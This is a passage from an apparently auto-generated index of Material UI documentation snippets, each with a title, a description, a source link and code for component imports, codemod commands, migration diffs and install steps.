border-radius: 1px;\n}\n```\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\n// webpack, Parcel or else will inject the CSS into the page\nimport styles from './CssModulesSliderDeep2.module.css';\nimport Slider from '@mui/material/Slider';\n\nexport default function CssModulesSliderDeep2() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider\n        defaultValue={30}\n        className={styles.slider}\n        slotProps={{ thumb: { className: styles.thumb } }}\n      />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Embedding a CodeSandbox Demo using an iframe in HTML\nDESCRIPTION: Embeds an interactive CodeSandbox demo within the page using an HTML `iframe` element. This specific example showcases Base UI animation features (CSS Animation transition) discussed in the surrounding text.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/base-ui-2024-plans.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"https://codesandbox.io/embed/3pdm56?view=preview&module=%2Fdemo.tsx&hidenavigation=1\"\n  style=\"width:100%; height: 300px; border:0; border-radius: 4px; overflow:hidden;\" title=\"/blog/base-ui-2024-plans/\" allow=\"accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking\" sandbox=\"allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts\"\n></iframe>\n```\n\n----------------------------------------\n\nTITLE: Importing IconButton Component in Joy UI\nDESCRIPTION: Basic import statement for using the IconButton component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button/button.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport IconButton from '@mui/joy/IconButton';\n```\n\n----------------------------------------\n\nTITLE: Importing RadioGroup Component in React\nDESCRIPTION: Import statement for the RadioGroup component which serves as a wrapper for multiple Radio components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/radio-button/radio-button.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport RadioGroup from '@mui/joy/RadioGroup';\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Size and Offset Props\nDESCRIPTION: Changes to Grid component props structure for sizes and offsets using the new API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/migrating-to-v6/migrating-to-v6.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n <Grid\n-  xs={12}\n-  sm={6}\n-  xsOffset={2}\n-  smOffset={3}\n+  size={{ xs: 12, sm: 6 }}\n+  offset={{ xs: 2, sm: 3 }}\n  >\n```\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid xs={6} xsOffset={2}>\n+<Grid size={6} offset={2}>\n```\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid xs>\n+<Grid size=\"grow\">\n```\n\n----------------------------------------\n\nTITLE: Importing Drawer Component in Joy UI\nDESCRIPTION: Basic import statement for the Drawer component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/drawer/drawer.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Drawer from '@mui/joy/Drawer';\n```\n\n----------------------------------------\n\nTITLE: Rendering Material UI Starting Links Collection in JSX\nDESCRIPTION: This snippet renders a custom React component called MaterialStartingLinksCollection, which likely displays a collection of links to help users get started with Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/overview/overview.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"component\": \"modules/components/MaterialStartingLinksCollection.js\"}\n```\n\n----------------------------------------\n\nTITLE: Installing @emotion/babel-plugin with npm in Bash\nDESCRIPTION: Shows the npm command required to install the @emotion/babel-plugin package, which is necessary to enable component selectors when using the emotion styled engine with MUI. This plugin must be present in the Babel configuration for component selectors to work. Run this command in the terminal at the root of your project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @emotion/babel-plugin\n```\n\n----------------------------------------\n\nTITLE: Running the color-imports codemod\nDESCRIPTION: Command to execute the codemod that updates color import paths for Material UI v1.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_124\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v1.0.0/color-imports <path>\n```\n\n----------------------------------------\n\nTITLE: Running the variant-prop codemod for Material-UI v5 migration\nDESCRIPTION: This command runs the variant-prop codemod which applies variant='standard' to TextField, FormControl, and Select components if no variant is defined, maintaining the v4 default behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/variant-prop <path>\n```\n\n----------------------------------------\n\nTITLE: Format Property Update\nDESCRIPTION: Shows the change from format to inputFormat prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/pickers-migration/pickers-migration.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n <DatePicker\n-  format=\"DD-MM-YYYY\"\n+  inputFormat=\"DD-MM-YYYY\"\n```\n\n----------------------------------------\n\nTITLE: Title Bar Below Image Implementation (Standard)\nDESCRIPTION: Shows how to position title bars below images in a standard image list layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"TitlebarBelowImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Migrating Input Props to Slots API\nDESCRIPTION: Transforms Input component from using the deprecated components/componentsProps API to the new slots/slotProps API pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_54\n\nLANGUAGE: diff\nCODE:\n```\n <Input\n-  components={{ Input: CustomInput, Root: CustomRoot }}\n-  componentsProps={{ input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }}\n+  slots={{ input: CustomInput, root: CustomRoot }}\n+  slotProps={{ input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Importing Box Component in React\nDESCRIPTION: This snippet shows how to import the Box component from Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/box/box.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Box from '@mui/material/Box';\n```\n\n----------------------------------------\n\nTITLE: Defining a Description Paragraph in HTML\nDESCRIPTION: This HTML snippet defines a paragraph (`<p>`) element assigned the CSS class `description`. It's used to display the introductory description text for the job role, allowing specific styling to be applied via CSS rules associated with the 'description' class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/careers/full-stack-engineer.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<p class=\"description\">You will join the Toolpad team, to explore the role of MUI in the low code space and help bring the early prototype to a usable product.</p>\n```\n\n----------------------------------------\n\nTITLE: Example Output CSS from sx Prop Mapping - CSS\nDESCRIPTION: Shows the final CSS that results from applying a spacing value of 3 with the default MUI theme. The value 3 is multiplied by the theme's spacing unit (default 8px), resulting in margin-bottom: 24px. This demonstrates the mapping from the system prop to the actual CSS applied.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/properties/properties.md#2025-04-22_snippet_5\n\nLANGUAGE: CSS\nCODE:\n```\n.my-class {\n  margin-bottom: 24px;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating ButtonGroup CSS Class Selectors\nDESCRIPTION: CSS selector transformations for ButtonGroup components, showing the transition from descendant selectors to direct child selectors with more specific class combinations.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_14\n\nLANGUAGE: css\nCODE:\n```\n.MuiButtonGroup-root.MuiButtonGroup-horizontal > .MuiButtonGroup-grouped\n.MuiButtonGroup-root.MuiButtonGroup-vertical > .MuiButtonGroup-grouped\n.MuiButtonGroup-root.MuiButtonGroup-text > .MuiButtonGroup-grouped\n.MuiButtonGroup-root.MuiButtonGroup-text.MuiButtonGroup-horizontal > .MuiButtonGroup-grouped\n.MuiButtonGroup-root.MuiButtonGroup-text.MuiButtonGroup-vertical > .MuiButtonGroup-grouped\n```\n\n----------------------------------------\n\nTITLE: Converting to top-level imports from @material-ui/core\nDESCRIPTION: This codemod converts individual submodule imports from @material-ui/core to consolidated root-level imports, which can help with bundle optimization in some cases.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_118\n\nLANGUAGE: diff\nCODE:\n```\n-import List from '@material-ui/core/List';\n-import { withStyles } from '@material-ui/core/styles';\n+import { List, withStyles } from '@material-ui/core';\n```\n\n----------------------------------------\n\nTITLE: Updating ListItemText Theme Default Props\nDESCRIPTION: Updates MuiListItemText theme configuration to use the new slotProps API instead of primaryTypographyProps and secondaryTypographyProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_40\n\nLANGUAGE: diff\nCODE:\n```\n MuiListItemText: {\n   defaultProps: {\n-  primaryTypographyProps:primaryTypographyProps\n+  slotProps:{ primary: primaryTypographyProps }\n-  secondaryTypographyProps:secondaryTypographyProps\n+  slotProps:{ secondary: secondaryTypographyProps }\n  },\n },\n```\n\n----------------------------------------\n\nTITLE: Running the Codemod for Lab Component Migration\nDESCRIPTION: Command to run the codemod that automatically updates imports for components that have moved from @mui/lab to @mui/material in Material-UI v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_25\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod v7.0.0/lab-removed-components <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Importing ListItemButton Component in React\nDESCRIPTION: Shows how to import the ListItemButton component, which is used to create interactive, clickable list items within a list.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\nimport ListItemButton from '@mui/joy/ListItemButton';\n```\n\n----------------------------------------\n\nTITLE: Importing Material UI Grid v1 and v2 in JavaScript\nDESCRIPTION: Demonstrates the import statements for both the legacy Grid v1 (`@mui/material/GridLegacy`) and the new Grid v2 (`@mui/material/Grid`) components in a JavaScript/React project using Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nimport Grid from '@mui/material/GridLegacy'; // The legacy grid, a.k.a. Grid v1\nimport Grid from '@mui/material/Grid'; // The updated grid, a.k.a. Grid v2\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Icons Package with Yarn\nDESCRIPTION: Command to add the MUI Icons package using Yarn, which is needed if you were previously using @material-ui/icons.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/icons-material\n```\n\n----------------------------------------\n\nTITLE: Installing MUI System with npm\nDESCRIPTION: Command to install MUI System along with its Emotion dependencies in your project using npm.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-system/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/system @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Updating ImageListItemBar CSS Classes for Action Icon\nDESCRIPTION: Transforms CSS selectors for ImageListItemBar's actionIcon when action position is left.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_46\n\nLANGUAGE: diff\nCODE:\n```\n- .MuiImageListItemBar-actionIconActionPosLeft\n+.MuiImageListItemBar-actionPositionLeft > .MuiImageListItemBar-actionIcon\n```\n\n----------------------------------------\n\nTITLE: Uninstalling @mui/styles After Completing Migration\nDESCRIPTION: Commands to remove the @mui/styles package after completing the migration to TSS-React, showing both npm and yarn versions of the command.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\nnpm uninstall @mui/styles\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn remove @mui/styles\n```\n\n----------------------------------------\n\nTITLE: Renaming fade Function to alpha\nDESCRIPTION: Diff showing the renaming of the fade function to alpha to better describe its functionality of overriding alpha values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_23\n\nLANGUAGE: diff\nCODE:\n```\n-import { fade } from '@mui/material/styles';\n+import { alpha } from '@mui/material/styles';\n\n  const classes = makeStyles(theme => ({\n-  backgroundColor: fade(theme.palette.primary.main, theme.palette.action.selectedOpacity),\n+  backgroundColor: alpha(theme.palette.primary.main, theme.palette.action.selectedOpacity),\n  }));\n```\n\n----------------------------------------\n\nTITLE: InputBase Classes Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated InputBase class selectors using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_53\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/input-base-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Typography Component HTML Structure\nDESCRIPTION: Basic HTML structure showing how Typography components are rendered in the DOM.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/typography/typography.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<p class=\"MuiTypography-root MuiTypography-body-md\">\n  <!-- Typography content -->\n  <span class=\"MuiTypography-root MuiTypography-inherit\">\n    <!-- Nested Typography content -->\n  </span>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Displaying Material-UI Components Demo in JavaScript\nDESCRIPTION: This code snippet demonstrates how to include a demo of Material-UI components using a custom demo component. It uses specific properties to control the display of the demo, such as hiding the toolbar and setting a background.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/supported-components/supported-components.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"MaterialUIComponents.js\", \"hideToolbar\": true, \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Box Component HTML Structure\nDESCRIPTION: This code snippet illustrates the basic HTML structure of the Box component, which consists of a single root div element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/box/box.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div className=\"MuiBox-root\">\n  <!-- contents of the Box -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Basic Linear Progress Implementation in React\nDESCRIPTION: Shows the basic implementation of the LinearProgress component from MUI Joy UI. This is the minimal setup required to use the component in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/linear-progress/linear-progress.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport LinearProgress from '@mui/joy/LinearProgress';\n\nexport default function MyApp() {\n  return <LinearProgress />;\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating Backdrop Component Props in JSX\nDESCRIPTION: Shows how to migrate Backdrop component props from the deprecated 'components/componentsProps' pattern to the newer 'slots/slotProps' approach in JSX code.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n <Backdrop\n-  components={{ Root: CustomRoot }}\n-  componentsProps={{ root: { testid: 'test-id' } }}\n+  slots={{ root: CustomRoot }}\n+  slotProps={{ root: { testid: 'test-id' } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Drawer Classes Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated drawer classes using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_29\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/drawer-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Updating Chip Component Class Naming Patterns in JavaScript\nDESCRIPTION: Demonstrates changes to MUI Chip component class patterns in JavaScript. This updates the class selectors to a more consistent pattern where variant and color classes are separate rather than combined into single classes.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n import { chipClasses } from '@mui/material/Chip';\n\n  MuiChip: {\n   styleOverrides: {\n     root: {\n-      [`&.${chipClasses.clickableColorPrimary}`]: {\n+      [`&.${chipClasses.clickable}.${chipClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.clickableColorSecondary}`]: {\n+      [`&.${chipClasses.clickable}.${chipClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.deletableColorPrimary}`]: {\n+      [`&.${chipClasses.deletable}.${chipClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.deletableColorSecondary}`]: {\n+      [`&.${chipClasses.deletable}.${chipClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.outlinedPrimary}`]: {\n+      [`&.${chipClasses.outlined}.${chipClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.outlinedSecondary}`]: {\n+      [`&.${chipClasses.outlined}.${chipClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.filledPrimary}`]: {\n+      [`&.${chipClasses.filled}.${chipClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${chipClasses.filledSecondary}`]: {\n+      [`&.${chipClasses.filled}.${chipClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.avatarSmall}`]: {\n+      [`&.${chipClasses.sizeSmall} > .${chipClasses.avatar}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.avatarMedium}`]: {\n+      [`&.${chipClasses.sizeMedium} > .${chipClasses.avatar}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.avatarColorPrimary}`]: {\n+      [`&.${chipClasses.colorPrimary} > .${chipClasses.avatar}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.avatarColorSecondary}`]: {\n+      [`&.${chipClasses.colorSecondary} > .${chipClasses.avatar}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.iconSmall}`]: {\n+      [`&.${chipClasses.sizeSmall} > .${chipClasses.icon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.iconMedium}`]: {\n+      [`&.${chipClasses.sizeMedium} > .${chipClasses.icon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.iconColorPrimary}`]: {\n+      [`&.${chipClasses.colorPrimary} > .${chipClasses.icon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.iconColorSecondary}`]: {\n+      [`&.${chipClasses.colorSecondary} > .${chipClasses.icon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.labelSmall}`]: {\n+      [`&.${chipClasses.sizeSmall} > .${chipClasses.label}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.labelMedium}`]: {\n+      [`&.${chipClasses.sizeMedium} > .${chipClasses.label}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconSmall}`]: {\n+      [`&.${chipClasses.sizeSmall} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconMedium}`]: {\n+      [`&.${chipClasses.sizeMedium} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconColorPrimary}`]: {\n+      [`&.${chipClasses.colorPrimary} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconColorSecondary}`]: {\n+      [`&.${chipClasses.colorSecondary} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconOutlinedColorPrimary}`]: {\n+      [`&.${chipClasses.outlined}.${chipClasses.colorPrimary} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconOutlinedColorSecondary}`]: {\n+      [`&.${chipClasses.outlined}.${chipClasses.colorSecondary} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconFilledColorPrimary}`]: {\n+      [`&.${chipClasses.filled}.${chipClasses.colorPrimary} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n-      [`& .${chipClasses.deleteIconFilledColorSecondary}`]: {\n+      [`&.${chipClasses.filled}.${chipClasses.colorSecondary} > .${chipClasses.deleteIcon}`]: {\n         color: 'red',\n       },\n     },\n   },\n  },\n```\n\n----------------------------------------\n\nTITLE: Configuring Right-to-Left Support for Pigment CSS\nDESCRIPTION: This snippet demonstrates how to update the configuration file to enable right-to-left support with Pigment CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_26\n\nLANGUAGE: diff\nCODE:\n```\n const pigmentConfig = {\n   theme: createTheme(),\n+  css: {\n+    // Specify your default CSS authoring direction\n+    defaultDirection: 'ltr',\n+    // Generate CSS for the opposite of the `defaultDirection`\n+    // This is set to `false` by default\n+    generateForBothDir: true,\n+  },\n }\n```\n\n----------------------------------------\n\nTITLE: Running MUI Codemod from CodeSandbox CI\nDESCRIPTION: Example command showing how to test a codemod using the CodeSandbox CI build link. This simulates a consumer-facing experience before merging a PR.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/CONTRIBUTING.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@https://pkg.csb.dev/mui/material-ui/commit/39bf9464/@mui/codemod deprecations/accordion-props docs/src/modules/brandingTheme.ts\n```\n\n----------------------------------------\n\nTITLE: Running Pigment CSS Vite Demo Project\nDESCRIPTION: Set of commands for installing dependencies, starting the development server, and building the project code. These should be executed in the project directory after building the workspace packages.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/pigment-css-vite-app/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npnpm install\npnpm dev\npnpm build\n```\n\n----------------------------------------\n\nTITLE: Installing @mui/material Package with npm\nDESCRIPTION: Command to install the @mui/material package, which is a peer dependency for @mui/docs. This is necessary if you're not already using Material UI in your project.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-docs/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material\n```\n\n----------------------------------------\n\nTITLE: Removing DialogTitle Typography Prop in React\nDESCRIPTION: Removes the 'disableTypography' prop from DialogTitle component. This codemod updates the DialogTitle component to match the new API in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_80\n\nLANGUAGE: diff\nCODE:\n```\n-<DialogTitle disableTypography />\n+<DialogTitle />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/dialog-title-props <path>\n```\n\n----------------------------------------\n\nTITLE: Updating MenuItem primaryText to children in Material UI v1.0.0\nDESCRIPTION: This codemod transforms MenuItem components by moving the primaryText prop value to become the component's children, which aligns with Material UI v1.0.0's API changes.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_128\n\nLANGUAGE: diff\nCODE:\n```\n-<MenuItem primaryText=\"Profile\" />\n-<MenuItem primaryText={\"Profile\" + \"!\"} />\n+<MenuItem>Profile</MenuItem>\n+<MenuItem>{\"Profile\" + \"!\"}</MenuItem>\n```\n\n----------------------------------------\n\nTITLE: Importing Box Component in React\nDESCRIPTION: Shows how to import the Box component from MUI System. This is the basic import statement needed before using the Box component in your React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/box/box.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Box from '@mui/system/Box';\n```\n\n----------------------------------------\n\nTITLE: Optimizing Vite for Pigment CSS Demo\nDESCRIPTION: Optional command to optimize Vite if errors occur while running the development server. This forces a fresh optimization of dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/pigment-css-vite-app/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npnpm vite optimize --force\n```\n\n----------------------------------------\n\nTITLE: Title Bar Below Image Implementation (Masonry)\nDESCRIPTION: Demonstrates title bar placement below images in a masonry layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"TitlebarBelowMasonryImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating LinearProgress Classes in MUI\nDESCRIPTION: Code changes for LinearProgress component classes, updating class selectors to use the new nested structure with buffer, determinate, and indeterminate variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_57\n\nLANGUAGE: diff\nCODE:\n```\nimport { linearProgressClasses } from '@mui/material/LinearProgress';\n\n MuiLinearProgress: {\n   styleOverrides: {\n     root: {\n-      [`&.${linearProgressClasses.bar1Buffer}`]: {},\n+      [`&.${linearProgressClasses.buffer} > .${linearProgressClasses.bar1}`]: {},\n-      [`&.${linearProgressClasses.bar1Determinate}`]: {},\n+      [`&.${linearProgressClasses.determinate} > .${linearProgressClasses.bar1}`]: {},\n-      [`&.${linearProgressClasses.bar1Indeterminate}`]: {},\n+      [`&.${linearProgressClasses.indeterminate} > .${linearProgressClasses.bar1}`]: {},\n-      [`&.${linearProgressClasses.bar2Buffer}`]: {},\n+      [`&.${linearProgressClasses.buffer} > .${linearProgressClasses.bar2}`]: {},\n-      [`&.${linearProgressClasses.bar2Indeterminate}`]: {},\n+      [`&.${linearProgressClasses.indeterminate} > .${linearProgressClasses.bar2}`]: {},\n-      [`&.${linearProgressClasses.barColorPrimary}`]: {},\n+      [`&.${linearProgressClasses.colorPrimary} > .${linearProgressClasses.bar}`]: {},\n-      [`&.${linearProgressClasses.barColorSecondary}`]: {},\n+      [`&.${linearProgressClasses.colorSecondary} > .${linearProgressClasses.bar}`]: {},\n-      [`&.${linearProgressClasses.dashedColorPrimary}`]: {},\n+      [`&.${linearProgressClasses.colorPrimary} > .${linearProgressClasses.dashed}`]: {},\n-      [`&.${linearProgressClasses.dashedColorSecondary}`]: {},\n+      [`&.${linearProgressClasses.colorSecondary} > .${linearProgressClasses.dashed}`]: {},\n     },\n   },\n  }\n```\n\n----------------------------------------\n\nTITLE: Moved Lab Modules Codemod Examples\nDESCRIPTION: This codemod updates imports for @material-ui/lab components that have been moved to @material-ui/core in v5. It handles both named and default imports.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_99\n\nLANGUAGE: diff\nCODE:\n```\n-import Skeleton from '@material-ui/lab/Skeleton';\n+import Skeleton from '@material-ui/core/Skeleton';\n```\n\n----------------------------------------\n\nTITLE: Simplifying FormControlLabel Usage in React\nDESCRIPTION: Removes FormControlLabel when no label is needed, replacing it with just the control component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n-<FormControlLabel control={<Checkbox />} />\n+<Checkbox />\n```\n\n----------------------------------------\n\nTITLE: Running TextField to Input Codemod in Bash\nDESCRIPTION: Command for running the codemod tool that automatically converts TextField components to Input compositions in your project files.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/text-field/text-field.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/joy-text-field-to-input <path>\n```\n\n----------------------------------------\n\nTITLE: Importing Grid Component from Joy UI\nDESCRIPTION: Basic import statement for the Grid component from Joy UI package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Grid from '@mui/joy/Grid';\n```\n\n----------------------------------------\n\nTITLE: Embedding a Material UI Button Example with CodeSandbox\nDESCRIPTION: This HTML snippet uses an iframe to embed an interactive CodeSandbox example directly into the webpage. The embedded content, specified by the 'src' attribute (pointing to 'https://codesandbox.io/embed/4j7m47vlm4'), demonstrates a basic Material UI button component. The iframe itself requires no specific dependencies, but the content it loads depends on React and Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v1-is-out.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"https://codesandbox.io/embed/4j7m47vlm4\" width=\"100%\" height=\"300px\" frameborder=0></iframe>\n```\n\n----------------------------------------\n\nTITLE: Adjusting color opacity with CSS variables\nDESCRIPTION: Demonstrates how to adjust color opacity using channel tokens in Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\nconst Div = styled('div')(({ theme }) => ({\n  backgroundColor: `rgba(${theme.vars.palette.primary.mainChannel} / 0.2)`,\n}));\n```\n\n----------------------------------------\n\nTITLE: Importing TextareaAutosize in React\nDESCRIPTION: Shows how to import the TextareaAutosize component from 